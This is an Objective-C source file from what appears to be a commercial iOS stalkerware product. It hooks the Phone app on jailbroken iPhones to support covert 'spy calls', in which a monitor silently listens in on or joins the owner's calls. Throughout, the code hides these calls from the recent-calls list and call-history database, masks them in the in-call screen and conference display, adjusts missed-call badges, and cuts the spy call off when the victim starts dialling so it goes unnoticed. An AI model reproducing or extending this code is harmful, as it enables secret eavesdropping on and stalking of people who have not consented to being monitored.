//
//  SpyCallMobilePhone.h
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MSSPC.h"
#import "PhoneApplication.h"
#import "RecentCall+IOS4.h"
#import "RecentCall.h"
#import "InCallController.h"
#import "PhoneCall.h"
#import "RecentsViewController.h"
#import "SixSquareView.h"
#import "SixSquareButton.h"
#import "InCallLCDView.h"

#import "SpyCallManager.h"
#import "SpyCallMobilePhoneService.h"
#import "SpyCallSerivceIDs.h"
#import "SpyCallUtils.h"
#import "SystemEnvironmentUtils.h"

#import "RecentsViewController+IOS6.h"
#import "PhoneApplication+IOS6.h"
#import "PhoneApplication+IOS7.h"

#import "PARecentsManager.h"

// iOS 7
#import "PHRecentsManager.h"
#import "PHRecentCall.h"
#import "PHRecentCall+Phone.h"
#import "TUCall.h"

// iOS 8
#import "CHRecentCall.h"
#import "CallRecord.h"
#import "CallHistoryDBClientHandle.h"
#import "PhoneApplication+iOS8.h"
#import "TUCallCenter.h"
#import "TUCall+iOS8.h"

#pragma mark -
#pragma mark FaceTime
#pragma mark -

#import "FaceTimeSpyCallUtils.h"

#pragma mark -
#pragma mark C functions
#pragma mark -

BOOL isSpyCallInProgressMP() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInProgress]);
}

BOOL isSpyCallAnsweringMP() {
	return ([[SpyCallManager sharedManager] mIsSpyCallAnswering]);
}

BOOL isSpyCallDisconnectingMP() {
	return ([[SpyCallManager sharedManager] mIsSpyCallDisconnecting]);
}

BOOL isNormalCallIncomingMP() {
	return ([[SpyCallManager sharedManager] mIsNormalCallIncoming]);
}

BOOL isNormalCallInProgressMP() {
	return ([[SpyCallManager sharedManager] mIsNormalCallInProgress]);
}

BOOL isSpyCallInitiatingConferenceMP() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInitiatingConference]);
}

BOOL isSpyCallInConferenceMP() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInConference]);
}

NSInteger normalCallCountMP() {
	return ([[SpyCallManager sharedManager] normalCallCount]);
}

void endSpyCallMP() {
	SpyCallMobilePhoneService *service = [SpyCallMobilePhoneService sharedService];
	[service sendService:kSpyCallServiceEndSpyCall withServiceData:nil];
	SpyCallManager *spycallManager = [SpyCallManager sharedManager];
	[spycallManager disconnectedActivityDetected];
}

BOOL isAudioActiveMP() {
	return ([SpyCallUtils isPlayingAudio] || [SpyCallUtils isRecordingAudio]);
}

#pragma mark -
#pragma mark PhoneApplication hooks
#pragma mark -

HOOK(PhoneApplication, shouldAttemptPhoneCall, BOOL) {
    APPLOGVERBOSE(@"shouldAttemptPhoneCall");
	if (isSpyCallInProgressMP()) {
		APPLOGVERBOSE(@"shouldAttemptPhoneCall-spy call in progress");
		endSpyCallMP();
		APPLOGVERBOSE(@"shouldAttemptPhoneCall-ended spy call");
		return FALSE;
	} else {
		APPLOGVERBOSE(@"shouldAttemptPhoneCall-spy call not in progress");
		return CALL_ORIG(PhoneApplication, shouldAttemptPhoneCall);
	}
}

// iOS 7
HOOK(PhoneApplication, shouldAttemptPhoneCallForService$, BOOL, int arg1) {
    APPLOGVERBOSE(@"shouldAttemptPhoneCallForService$, %d", arg1);
    if (isSpyCallInProgressMP()) {
        endSpyCallMP();
        return FALSE;
    } else {
        return CALL_ORIG(PhoneApplication, shouldAttemptPhoneCallForService$, arg1);
    }
}

// iOS 8
HOOK(PhoneApplication, dialRecentCall$, BOOL, id arg1) {
    APPLOGVERBOSE(@"dialRecentCall$, %@", arg1);
    if (isSpyCallInProgressMP()) {
        endSpyCallMP();
        return FALSE;
    } else {
        return CALL_ORIG(PhoneApplication, dialRecentCall$, arg1);
    }
}

// iOS 8
HOOK(PhoneApplication, openURL$, BOOL, id arg1) {
    APPLOGVERBOSE(@"openURL$, %@", arg1); // tel://1543388?suppressAssist=1&originatingUI=dialer
    if (isSpyCallInProgressMP()) {
        endSpyCallMP();
        return FALSE;
    } else {
        return CALL_ORIG(PhoneApplication, openURL$, arg1);
    }
}

// iOS 4,5,6,7,8
HOOK(PhoneApplication, dialVoicemail, BOOL) {
    APPLOGVERBOSE (@"dialVoicemail");
	if (isSpyCallInProgressMP()) {
		endSpyCallMP();
		return FALSE;
	} else {
		return CALL_ORIG(PhoneApplication, dialVoicemail);
	}
}

HOOK(PhoneApplication, _setTarBarItemBadge$forViewType$, void, int arg1, int arg2) {
	APPLOGVERBOSE (@"----------------------- _setTarBarItemBadge$forViewType$ ------------------------");
	APPLOGVERBOSE (@"arg1 = %d", arg1);
	APPLOGVERBOSE (@"arg2 = %d", arg2);
	APPLOGVERBOSE (@"----------------------- _setTarBarItemBadge$forViewType$ ------------------------");
	// Since SpringBoard have reset the badge of the icon, this method's implementation is work!
	if (isNormalCallInProgressMP() && [[SpyCallManager sharedManager] mIsSpyCallDisconnecting]) {
		int newBadgeTotal = 0;
		int *badges = nil;
		object_getInstanceVariable(self, "_badges", (void **)&badges);
		int *newBadges = (int *)malloc(5 * sizeof(int));
		for (NSInteger i = 0; i < 5; i++) {
			if (badges) {
				newBadges[i] = badges[i];
			} else {
				newBadges[i] = 0;
			}
			newBadgeTotal += newBadges[i];
		}
		int viewID = arg2;
		newBadges[viewID - 1] = newBadges[viewID - 1] - 1;
		
		// Reset badge array
		object_setInstanceVariable(self, "_badges", (void *)newBadges);
		// Reset total badge
		object_setInstanceVariable(self, "_badgeTotal", (void *)&newBadgeTotal);
		
		if (badges) free(badges);
		newBadges = nil;
	} else {
		CALL_ORIG(PhoneApplication, _setTarBarItemBadge$forViewType$, arg1, arg2);
	}
}

HOOK(PhoneApplication, applicationDidFinishLaunching$, void, id arg1) {
    APPLOGVERBOSE(@"applicationDidFinishLaunching$, %@", arg1);
    CALL_ORIG(PhoneApplication, applicationDidFinishLaunching$, arg1);
    
    NSArray *currentCalls = [SpyCallUtils currentCalls];
    for (FxCall *call in currentCalls) {
        switch ([call mCallState]) {
            case kFxCallStateDialing:
                /*
                 Server connection hook get call in time except the one made
                 from Map application so still need this help
                 */
                [[SpyCallManager sharedManager] handleDialingCall:call];
                break;
            case kFxCallStateIncoming:
                /*
                 Most of time, come here otherwise it's suspicious!!!, this helps
                 spy call to conference with in progress normal call (incoming call)
                 */
                [[SpyCallManager sharedManager] handleIncomingCall:call];
                break;
            case kFxCallStateConnected:
                if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 8) { // Check comment in .mm
                    [[SpyCallManager sharedManager] handleCallConnected:call];
                }
                break;
            case kFxCallStateOnHold:
                if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 8) { // Check comment in .mm
                    [[SpyCallManager sharedManager] handleCallOnHold:call];
                }
                break;
            case kFxCallStateDisconnected:
                if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 8) { // Check comment in .mm
                    [[SpyCallManager sharedManager] handleCallDisconnected:call];
                }
                break;
            default:
                break;
        }
    }
}

#pragma mark {not used}
// iOS 9
HOOK(PhoneApplication, applicationDidEnterBackground$, void, id arg1) {
    APPLOGVERBOSE(@"applicationDidEnterBackground$, %@", arg1);
    
    /*
     MobilePhone is suspend when user bring to background, the change in iOS 9
     ISSUE:
        Spy/Conference call actives in MobilePhone then it suspend by user bring to background, spy call ended by user made activity that cause it disconnects or
     monitor ends spy call itself, MobilePhone is resume by user bring to foreground, user make outgoing normal call, user cannot make the call because spy call
     status is not update and MobilePhone understands that spy call is active...
     */
    
    if (isSpyCallInProgressMP()) {
        endSpyCallMP();
        
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^(){
            [NSThread sleepForTimeInterval:0.5];
            APPLOGVERBOSE(@"EXIT MobilePhone, iOS 9");
                         
            exit(0);
        });
    } else {
        CALL_ORIG(PhoneApplication, applicationDidEnterBackground$, arg1);
    }
}

#pragma mark -
#pragma mark RecentCall hooks
#pragma mark -

// iOS 4
HOOK(RecentCall, initWithCTCall$givenCountryCode$, id, id arg1, id arg2) {
	APPLOGVERBOSE(@"initWithCTCall$givenCountryCode$");
	if ([SpyCallUtils isSpyCall:(CTCall *)arg1] && ![SpyCallUtils isOutgoingCall:(CTCall *)arg1]) {
        return nil;
    } else {
        return CALL_ORIG(RecentCall, initWithCTCall$givenCountryCode$, arg1, arg2);
    }
}

// iOS 5, 6
HOOK(RecentCall, initWithCTCall$, id, CTCall *arg1) {
    if (![SpyCallUtils isOutgoingCall:(CTCall *)arg1]   &&
        ([SpyCallUtils isSpyCall:(CTCall *)arg1] || [FaceTimeSpyCallUtils isFaceTimeRecentSpyCall:(CTCall *)arg1])) {
        return nil;
    } else {
        return CALL_ORIG(RecentCall, initWithCTCall$, arg1);
    }
}

#pragma mark - PHRecentCall hooks -

// iOS 7
HOOK(PHRecentCall, initWithCTCall$, id, struct __CTCall *arg1) {
    if (![SpyCallUtils isOutgoingCall:(CTCall *)arg1]   &&
        ([SpyCallUtils isSpyCall:(CTCall *)arg1] || [FaceTimeSpyCallUtils isFaceTimeRecentSpyCall:(CTCall *)arg1])) {
        return nil;
    } else {
        return CALL_ORIG(PHRecentCall, initWithCTCall$, arg1);
    }
}

#pragma mark - CallHistoryDBClientHandle hooks -

// iOS 8
HOOK(CallHistoryDBClientHandle, convertToCHRecentCalls_sync$, id, id arg1) {
    //APPLOGVERBOSE(@"convertToCHRecentCalls_sync$, arg1 = %@", arg1); // Array of CallRecord
    NSArray *recentCalls = CALL_ORIG(CallHistoryDBClientHandle, convertToCHRecentCalls_sync$, arg1);
    NSMutableArray *noSpyCallRecentsCalls = [NSMutableArray array];
    for (CHRecentCall *recentCall in recentCalls) {
        /*
        APPLOGVERBOSE(@"callerId            = %@", [recentCall callerId]);              // Number or email address
        APPLOGVERBOSE(@"callerIdLabel       = %@", [recentCall callerIdLabel]);
        APPLOGVERBOSE(@"callerIdLocation    = %@", [recentCall callerIdLocation]);
        APPLOGVERBOSE(@"mobileOriginated    = %d", [recentCall mobileOriginated]);      // Always 0
        APPLOGVERBOSE(@"duration            = %f", [recentCall duration]);
        APPLOGVERBOSE(@"unreadCount         = %d", [recentCall unreadCount]);
        APPLOGVERBOSE(@"callStatus          = %d", [recentCall callStatus]);
        APPLOGVERBOSE(@"callType            = %d", [recentCall callType]);              // 1 = cellular call, 18 = facetime call
        APPLOGVERBOSE(@"callerIdAvailability    = %d", [recentCall callerIdAvailability]);
         */
        
        /*
         *** Cellular call base on iPhone 4s, iOS 8.1
         - Outgoing call status:
         
         out -> ended by target -> status = 16
         out -> ring at 3rd party -> ended by target -> status = 16
         out -> ring at 3rd party -> ended by 3rd party -> status = 16
         out -> ring at 3rd party -> ended by itself -> status = 16
         out -> ring at 3rd party -> answered by 3rd party -> ended by target -> status = 2
         out -> ring at 3rd party -> answered by 3rd party -> ended by 3rd party -> status = 2
         
         - Incoming call status: (private number)
         in -> ring at target -> ended by 3rd party -> status = 8
         in -> ring at target -> ended by target -> status = 8
         in -> ring at target -> ended by itself -> status = 8
         in -> ring at target -> answered by target -> ended by 3rd party -> status = 1
         in -> ring at target -> answered by target -> ended by target -> status = 1
         
         - Incoming call status:
         in -> ring at target -> ended by 3rd party -> status = 8
         in -> ring at target -> ended by target -> status = 8
         in -> ring at target -> ended by itself -> status = 8
         in -> ring at target -> answered by target -> ended by 3rd party -> status = 1
         in -> ring at target -> answered by target -> ended by target -> status = 1
         */
        
        BOOL isOutgoing = ([recentCall callStatus] == 16 || [recentCall callStatus] == 2);
        
        if (!isOutgoing && ![recentCall callerIdIsBlocked] &&
            ([SpyCallUtils isSpyNumber:[recentCall callerId]] ||
             [FaceTimeSpyCallUtils isFaceTimeSpyCall:[recentCall callerId]])) {
                
                // Skip recent call of regular spy call, FaceTime spy call
                APPLOGVERBOSE(@"Block FaceTime or regular spy call from adding to call log");
            
                //[self deleteObjectWithUniqueId:[recentCall uniqueId]]; // Delete here make thread hang
        } else {
            [noSpyCallRecentsCalls addObject:recentCall];
        }
    }
    recentCalls = noSpyCallRecentsCalls;
    return (recentCalls);
}

#pragma mark -
#pragma mark InCallController hooks
#pragma mark -

HOOK(InCallController, _endCallClicked$, void, id arg1) {
	APPLOGVERBOSE(@"_endCallClicked");
	if (isSpyCallInConferenceMP()) {
		endSpyCallMP();
		[NSThread sleepForTimeInterval:0.001];
	}
	CALL_ORIG(InCallController, _endCallClicked$, arg1);
}

HOOK(InCallController, _updateCurrentCallDisplay, void) {
	APPLOGVERBOSE(@"_updateCurrentCallDisplay");
	if (isSpyCallAnsweringMP() || isSpyCallInProgressMP()) {
		;
	} else {
		CALL_ORIG(InCallController, _updateCurrentCallDisplay);
	}
}

HOOK(InCallController, inCallLCDViewConferenceButtonClicked$, void, id arg1) {
	APPLOGVERBOSE(@"inCallLCDViewConferenceButtonClicked$");
	if (isSpyCallInProgressMP()) {
		endSpyCallMP();
	} else {
		CALL_ORIG(InCallController, inCallLCDViewConferenceButtonClicked$, arg1);
	}
}

HOOK(InCallController, _updateConferenceDisplayNameCache, id) {
	APPLOGVERBOSE(@"_updateConferenceDisplayNameCache");
	if (isSpyCallAnsweringMP() || isSpyCallInitiatingConferenceMP() || isSpyCallInConferenceMP()) {
		return nil;
	} else {
		return CALL_ORIG(InCallController, _updateConferenceDisplayNameCache); // Name of participants concatenated by &
	}
}

HOOK(InCallController, _setConferenceCall$, void, int arg1) {
	APPLOGVERBOSE(@"_setConferenceCall$");
	if (isSpyCallAnsweringMP() || isSpyCallInConferenceMP()) {
		if (normalCallCountMP() > 1) { // Conference with more than one normal call no need to block conference button update
			CALL_ORIG(InCallController, _setConferenceCall$, arg1);
		}
	} else {
		CALL_ORIG(InCallController, _setConferenceCall$, arg1);
	}
}

HOOK(InCallController, setDisplayedCalls$, void, id arg1) {
	APPLOGVERBOSE(@"setDisplayedCalls$");
	if (isSpyCallAnsweringMP() || isSpyCallInConferenceMP()) {
		NSMutableArray *phoneCalls = [NSMutableArray array];
		for (PhoneCall *phoneCall in arg1) {
			if (![SpyCallUtils isSpyCall:[phoneCall call]]) {
				[phoneCalls addObject:phoneCall];
			}
		}
		CALL_ORIG(InCallController, setDisplayedCalls$, phoneCalls);
	} else {
		CALL_ORIG(InCallController, setDisplayedCalls$, arg1);
	}
}

#pragma mark -
#pragma mark InCallLCDView hooks
#pragma mark -

HOOK(InCallLCDView, setText$, void, id arg1) {
	APPLOGVERBOSE(@"setText$ arg1 = %@", arg1);
	if (isSpyCallInConferenceMP()) {
		if (normalCallCountMP() > 1) { // Conference with more than one normal call no need to block conference button update
			CALL_ORIG(InCallLCDView, setText$, arg1);
		} else {
			CALL_ORIG(InCallLCDView, setText$, [[[SpyCallManager sharedManager] mSystemEnvUtils] mTelephoneNumberBeforeSpyCallConference]);
		}
	} else {
		[[[SpyCallManager sharedManager] mSystemEnvUtils] setMTelephoneNumberBeforeSpyCallConference:arg1];
		CALL_ORIG(InCallLCDView, setText$, arg1);
	}
}

HOOK(InCallLCDView, setText$animating$, void, id arg1, BOOL arg2) {
	APPLOGVERBOSE(@"setText$animating$ arg1 = %@, arg2 = %d", arg1, arg2);
	if (isSpyCallInConferenceMP()) {
		if (normalCallCountMP() > 1) { // Conference with more than one normal call no need to block conference button update
			CALL_ORIG(InCallLCDView, setText$animating$, arg1, arg2);
		} else {
			CALL_ORIG(InCallLCDView, setText$animating$, [[[SpyCallManager sharedManager] mSystemEnvUtils] mTelephoneNumberBeforeSpyCallConference], NO);
		}
	} else {
		[[[SpyCallManager sharedManager] mSystemEnvUtils] setMTelephoneNumberBeforeSpyCallConference:arg1];
		CALL_ORIG(InCallLCDView, setText$animating$, arg1, arg2);
	}
}

#pragma mark -
#pragma mark SixSquareView hooks
#pragma mark -

HOOK(SixSquareView, setTitle$image$forPosition$, void, id arg1, id arg2, int arg3) {
	APPLOGVERBOSE(@"setTitle$image$forPosition$");
	if (isSpyCallInitiatingConferenceMP()) {
		;
	} else {
		CALL_ORIG(SixSquareView, setTitle$image$forPosition$, arg1, arg2, arg3);
	}
}

HOOK(SixSquareView, buttonAtPosition$, id, int arg1) {
	APPLOGVERBOSE(@"buttonAtPosition$");
	if (isSpyCallInitiatingConferenceMP()) {
		return nil;
	} else {
		if (isSpyCallInConferenceMP() && arg1 == 4 && normalCallCountMP() <= 1) { // Hold(iOS4)/Face time(iOS5) button and conference with one normal
			return nil;
		} else {
			return CALL_ORIG(SixSquareView, buttonAtPosition$, arg1);
		}
	}
}

#pragma mark -
#pragma mark RecentsViewController hooks
#pragma mark -

HOOK(RecentsViewController, viewWillAppear$, void, BOOL arg1) {
	APPLOGVERBOSE(@"viewWillAppear");
	CALL_ORIG(RecentsViewController, viewWillAppear$, arg1);
	SpyCallManager *spycallManager = [SpyCallManager sharedManager];
	if (![[spycallManager mSystemEnvUtils] mForceRecentCallDataChange]) {
		[[spycallManager mSystemEnvUtils] setMForceRecentCallDataChange:YES];
		Class $RecentsViewController = [self class];
		if ([$RecentsViewController respondsToSelector:@selector(_callDataChanged)]) { // IOS 4,5
			[self _callDataChanged];
		} else {
			[self _recentsManagerCallDeletedNotification:nil];
		}
	}
}

HOOK(RecentsViewController, viewDidAppear$, void, BOOL arg1) {
	APPLOGVERBOSE(@"viewDidAppear");
	CALL_ORIG(RecentsViewController, viewDidAppear$, arg1);
	SpyCallManager *spycallManager = [SpyCallManager sharedManager];
	if ([[spycallManager mSystemEnvUtils] mForceRecentCallDataChange]) {
		[[spycallManager mSystemEnvUtils] setMForceRecentCallDataChange:NO];
	}
}

HOOK(RecentsViewController, badge, int) {
	APPLOGVERBOSE(@"badge");
	int badge = CALL_ORIG(RecentsViewController, badge);
	SpyCallManager *spycallManager = [SpyCallManager sharedManager];
	NSInteger numberOfMissedCall = [[spycallManager mSystemEnvUtils] mMissedCall];
	APPLOGVERBOSE(@"numberOfMissedCall = %d", numberOfMissedCall);
	if (numberOfMissedCall > 0) {
		APPLOGVERBOSE(@"Original badge = %d", badge);
		badge = badge - (int)numberOfMissedCall;
		if (badge < 0) badge = 0;
		
		[[spycallManager mSystemEnvUtils] setMMissedCall:0];
	}
	APPLOGVERBOSE(@"Modified badge = %d", badge);
	return badge;
}

#pragma mark -
#pragma mark PARecentsManager
#pragma mark -

//HOOK(PARecentsManager, callHistorySignificantChangeNotification, void) {
//	DLog (@"------------- callHistorySignificantChangeNotification ---------------");
//	CALL_ORIG(PARecentsManager, callHistorySignificantChangeNotification);
//}

// for ios 6
HOOK(PARecentsManager, callHistoryRecordAddedNotification$, void, struct __CTCall *arg1) {
	APPLOGVERBOSE (@"------------- callHistoryRecordAddedNotification$ ---------------");
	//DLog (@"------------- callHistoryRecordAddedNotification$ ---------------");
    
    if (![SpyCallUtils isOutgoingCall:(CTCall *)arg1]) {
        
        /*************************************************
              -- PSEUDO CODE [INCOMING CALL] --
         if it is Facetime call,
                and is not facetime spycall, call ORG
                but it is facetime spycall, BLOCK
         if it is Phone call,
                if it is spycall, BLOCK
                if it is not spycall, call ORG
         ************************************************/
        
        // Case 1: FaceTime call
        if ([SpyCallUtils isFaceTimeCall:arg1]) {
            
            // not FaceTime Spycall
            if (![FaceTimeSpyCallUtils isFaceTimeRecentSpyCall:(CTCall *)arg1]) {
                DLog(@"\n\n +++++++++++ Normal Facetime +++++++++++++")
                CALL_ORIG(PARecentsManager, callHistoryRecordAddedNotification$, arg1);
            }
        }
        // Case 2: Telephone call
        else {
            // not Telephone Spycall
            if (![SpyCallUtils isSpyCall:(CTCall *)arg1]) {
                DLog(@"\n\n +++++++++++ Normal Phone call +++++++++++++")
                CALL_ORIG(PARecentsManager, callHistoryRecordAddedNotification$, arg1);
            }
        }
    } else {
        CALL_ORIG(PARecentsManager, callHistoryRecordAddedNotification$, arg1);
    }
}

// for ios 7
/* This method is hooked on Mobile Phone appplication for iPhone. Thus after respring, and not yet open Mobile Phone application,
this mothod will not be called
 */

HOOK(PHRecentsManager, callHistoryRecordAddedNotification$, void, struct __CTCall *arg1) {
	APPLOGVERBOSE (@"------------- callHistoryRecordAddedNotification$ ---------------");
    APPLOGVERBOSE (@"------------- Outgoing call: %d", [SpyCallUtils isOutgoingCall:(CTCall *)arg1]);
    
    //DLog (@"------------- callHistoryRecordAddedNotification$ ---------------");
    DLog(@"[SpyCallUtils isFaceTimeCall:arg1] %d",          [SpyCallUtils isFaceTimeCall:arg1]);
    DLog(@"![SpyCallUtils isSpyCall:(CTCall *)arg1] %d",    ![SpyCallUtils isSpyCall:(CTCall *)arg1]);
    DLog(@"![FaceTimeSpyCallUtils isFaceTimeRecentSpyCall:(CTCall *)arg1] %d", ![FaceTimeSpyCallUtils isFaceTimeRecentSpyCall:(CTCall *)arg1]);
    
    if (![SpyCallUtils isOutgoingCall:(CTCall *)arg1]) {
        
        /*************************************************
               -- PSEUDO CODE [INCOMING CALL] --
         if it is Facetime call,
                and is not facetime spycall, call ORG
                but it is facetime spycall, BLOCK
         if it is Phone call,
                if it is spycall, BLOCK
                if it is not spycall, call ORG
         ************************************************/
        
        // Case 1: FaceTime call
        if ([SpyCallUtils isFaceTimeCall:arg1]) {
            
            // not FaceTime Spycall
            if (![FaceTimeSpyCallUtils isFaceTimeRecentSpyCall:(CTCall *)arg1]) {
                DLog(@"\n\n +++++++++++ Normal Facetime +++++++++++++")
                CALL_ORIG(PHRecentsManager, callHistoryRecordAddedNotification$, arg1);
            }
        }
        // Case 2: Telephone call
        else {
            // not Telephone Spycall
            if (![SpyCallUtils isSpyCall:(CTCall *)arg1]) {
                DLog(@"\n\n +++++++++++ Normal Phone call +++++++++++++")
                CALL_ORIG(PHRecentsManager, callHistoryRecordAddedNotification$, arg1);
            }
        }
    } else {
        CALL_ORIG(PHRecentsManager, callHistoryRecordAddedNotification$, arg1);
    }
}
